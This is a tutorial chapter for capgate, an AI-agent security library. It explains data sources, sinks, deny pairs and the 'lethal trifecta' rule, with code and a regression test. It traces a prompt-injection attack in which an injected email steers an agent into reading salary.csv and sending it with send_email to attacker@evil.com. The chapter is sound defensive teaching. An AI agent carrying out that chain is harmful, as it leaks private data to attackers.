# 05 — Flow and the lethal trifecta

You have labels ([04](04-taint-labels.md)) and capabilities ([03](03-capabilities.md)). Now the
rule that connects them, and the headline defense of the project.

## Sources and sinks

Classic application-security vocabulary.

A **source** is where data originates. [`flow/sources.py`](../src/capgate/flow/sources.py):

```python
class DataSourceKind(StrEnum):
    FILESYSTEM = "filesystem"
    DATABASE = "database"
    SECRETS = "secrets"
    PII = "pii"
    CUSTOMER_PII = "customer_pii"
    UNTRUSTED_WEB = "untrusted_web"
    EMAIL = "email"
    SLACK = "slack"
    TOOL_RESULT = "tool_result"
    MEMORY = "memory"
```

A **sink** is a destination with security impact.
[`flow/sinks.py`](../src/capgate/flow/sinks.py):

```python
class SinkKind(StrEnum):
    NONE = "none"
    NETWORK_EXTERNAL = "network.external"
    EMAIL_EXTERNAL = "email.external"
    SLACK_EXTERNAL = "slack.external"
    SLACK_PUBLIC = "slack.public"
    SHELL_EXEC = "shell.exec"
    DB_WRITE = "db.write"
    GITHUB_PR = "github.pr"
    PAYMENT = "payment"
    FILE_WRITE = "file.write"
```

And the subset that can carry data *out of your trust boundary*:

```python
EXTERNAL_SINKS = frozenset({
    SinkKind.NETWORK_EXTERNAL,
    SinkKind.EMAIL_EXTERNAL,
    SinkKind.SLACK_EXTERNAL,
    SinkKind.SLACK_PUBLIC,
    SinkKind.GITHUB_PR,
})
```

`SHELL_EXEC` and `DB_WRITE` are *not* in that set — they are dangerous, but they are not
exfiltration channels. Different rules cover them.

Each tool declares its sink in trusted metadata. Getting this wrong is the classic
misconfiguration: marking an external sender as `sink: none` disables the defense for that tool
entirely.

### Source tags are validated

`source_tags` used to accept any list of strings, which meant a typo — `secret` instead of
`secrets` — silently disabled the deny-pair rule its author meant to trigger, with no error
anywhere. That hole is now closed by
[`is_valid_source_tag`](../src/capgate/flow/sources.py):

- A **bare** tag must name a `DataSourceKind`, because bare tags are exactly what deny pairs
  match on.
- A **free-form** breadcrumb must be namespaced — `mcp:mail`, `agentdojo:workspace:send_email`.

So `secret` is now a `ConfigError` at load time, while `mcp:mail` still works. The rule is:
if it could be a taxonomy name, it must be one.

> **Still open:** [`taint/sources.py`](../src/capgate/taint/sources.py) has a *separate*
> `OriginKind` enum, and `classify_source` injects its value as a bare tag. Some of those
> values do not exist in `DataSourceKind` — notably `OriginKind.WEB` produces `web`, which does
> **not** match the `untrusted_web → shell.exec` deny pair. Tools classified that way rely on
> the trifecta rule alone. Mapping the two enums would tighten enforcement, but it changes
> which calls block, so it needs a deliberate decision rather than a silent fix.

## Static deny pairs

First, explicit forbidden combinations.
[`flow/rules.py:24-28`](../src/capgate/flow/rules.py#L24-L28):

```python
DEFAULT_DENY_PAIRS = (
    DenyPair(DataSourceKind.SECRETS,       SinkKind.NETWORK_EXTERNAL),
    DenyPair(DataSourceKind.UNTRUSTED_WEB, SinkKind.SHELL_EXEC),
    DenyPair(DataSourceKind.CUSTOMER_PII,  SinkKind.SLACK_PUBLIC),
)
```

Read them aloud: secrets never go to the external network. Untrusted web content never reaches
a shell. Customer PII never lands in a public Slack channel.

These are absolute — checked first, before anything else, regardless of labels or capabilities.

## The lethal trifecta

Simon Willison named the pattern in June 2025. An agent becomes dangerous when three things
meet on one path:

1. **Access to private data** — something worth stealing
2. **Exposure to untrusted content** — an attacker can put words in front of it
3. **A way to communicate externally** — a route out

Any **two** are fine:

| Combination | Why it's survivable |
|---|---|
| private data + untrusted content, no external route | attacker can confuse it, but nothing escapes |
| private data + external route, no untrusted content | nobody is steering it |
| untrusted content + external route, no private data | attacker exfiltrates nothing of value |

All **three** is exfiltration waiting to happen.

Meta's "Rule of Two" (Oct 2025) makes the same point as a design guideline: an unsupervised
agent should satisfy at most two of {untrusted input, private data, state change or external
comms}.

### The rule in code

Your labels already carry the first two conditions. Tool metadata carries the third. So the
rule is a three-line boolean —
[`flow/rules.py:57-68`](../src/capgate/flow/rules.py#L57-L68):

```python
def check_lethal_trifecta(label: Label, sink: SinkKind) -> Decision | None:
    is_private = label.confidentiality in {Confidentiality.INTERNAL, Confidentiality.SECRET}
    if is_private and label.integrity is Integrity.UNTRUSTED and sink in EXTERNAL_SINKS:
        return Decision(
            verdict="BLOCK",
            reason="external sink blocked: private data influenced by untrusted content",
            rule_id="flow.lethal_trifecta",
            labels=label_strings(label),
        )
    return None
```

That is the headline defense. Three conditions, one `and`, no model involved, same answer every
time.

Note `internal` counts as private, not just `secret`. Conservative on purpose.

## Watching it fire

Walk the attack from [01](01-the-problem.md) through the rule.

**Call 1 — `read_emails()`**

Result label: `internal / untrusted`, tags `{email}`. Untrusted because an email body is
attacker-controllable. Sink is `none`.

→ Not an external sink. **ALLOW.**

**Call 2 — `read_file("salary.csv")`**

The file's own metadata says `secret / trusted`. But the call was influenced by call 1's
result, so the argument label is `internal / untrusted`, and
[`propagate_tool_result`](../src/capgate/taint/propagation.py#L15-L16) joins them:

```
(internal, untrusted, {email})  JOIN  (secret, trusted, {secrets})
    = (secret, untrusted, {email, secrets})
```

Sink is still `none`.

→ **ALLOW.** The agent legitimately read a file.

**Call 3 — `send_email(to="attacker@evil.com", body=...)`**

- confidentiality `secret` → private ✓
- integrity `untrusted` → attacker-influenced ✓
- sink `email.external` → in `EXTERNAL_SINKS` ✓

→ **BLOCK**, `flow.lethal_trifecta`.

## Two things to notice

**The handler never ran.** Not "an error was returned after the fact." Look at the ordering in
[`mediator.py:98-100`](../src/capgate/engine/mediator.py#L98-L100):

```python
decision = self._pipeline.decide(self._context, event)
if decision.verdict != "ALLOW":
    return self._rejected(event, decision, execution_started=False)
```

The decision happens *before* `execute()` is called. No partial send. No network connection. No
half-delivered payload. `execution_started=False` is recorded in the receipt as evidence.

This is why the demo asserts on the *side effect*, not the return value —
[`examples/langgraph_security_demo.py:125`](../examples/langgraph_security_demo.py#L125):

```python
_require(external_sink_calls == 0, "blocked external sink executed")
```

Testing that an error came back proves nothing. Testing the sink was never reached proves the
control works.

**The capability policy said ALLOW.** In the demo policy the agent explicitly holds
`send:external`:

```yaml
agent: langgraph-demo
can: [read:status, read:private, send:external]
```

Flow control blocked it anyway. Permission to perform an action is not permission to perform it
*with this data*.

That is why you need both checks. They answer different questions, and either alone leaves a
hole:

| | Capabilities alone | Taint alone |
|---|---|---|
| Email agent exfiltrating | ❌ allowed — sending is its job | ✅ blocked |
| Agent shelling out with no data flow | ✅ blocked — no `exec:shell` | ❌ allowed — nothing tainted yet |

## Order of evaluation

[`check_flow`](../src/capgate/flow/rules.py#L41-L54) runs deny pairs first, then the trifecta:

```python
def check_flow(label, sink, deny_pairs=DEFAULT_DENY_PAIRS) -> Decision | None:
    for pair in deny_pairs:
        if pair.source.value in label.source_tags and pair.sink is sink:
            return Decision(verdict="BLOCK", rule_id=pair.rule_id, ...)
    return check_lethal_trifecta(label, sink)
```

Specific rules produce better error messages than general ones. `flow.deny.secrets_to_network_external`
tells you exactly which policy you hit; `flow.lethal_trifecta` is the catch-all.

Returning `None` means "no objection" — the pipeline continues to the next check. It does not
mean allow.

## The frozen regression test

[`tests/regression/test_exfiltration.py`](../tests/regression/test_exfiltration.py) locks this
behavior in permanently. The pattern to copy for every attack you defeat:

```python
assert pipeline.decide(context, read).verdict == "ALLOW"
pipeline.observe_result(context, read, ToolResultEvent(...))
decision = pipeline.decide(context, _call("send_external", 2))
assert decision.verdict == "BLOCK"
assert decision.rule_id == "flow.lethal_trifecta"
```

**A blocked attack without a regression test is incomplete.** That rule comes from the project's
own build directive and it is a good habit generally — otherwise a refactor six weeks later
quietly reopens the hole.

---

Previous: [04 — Taint labels](04-taint-labels.md) · Next: [06 — Receipts](06-receipts.md)
